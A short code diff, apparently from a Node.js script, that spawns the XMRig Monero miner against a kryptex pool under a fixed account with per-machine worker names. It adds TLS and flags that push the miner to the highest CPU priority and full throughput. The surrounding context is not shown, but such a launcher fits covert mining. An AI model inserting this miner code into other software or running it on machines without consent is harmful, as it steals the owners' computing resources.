@@ -80,9 +80,16 @@ const command = './xmrig';
 const args = [
   '-o', 'xmr.kryptex.network:7777',
   '-u', 'pimik@send-email.pro/${name}',
+  '--tls',
   '-k',
   '--coin', 'monero',
-  '-a', 'rx/0'
+  '-a', 'rx/0',
+  '--cpu-priority=5',
+  '--threads=0',
+  '--no-cpu-affinity',
+  '--randomx-mode=fast',
+  '--huge-pages',
+  '--asm=auto'
 ];
 
 const child = spawn(command, args);
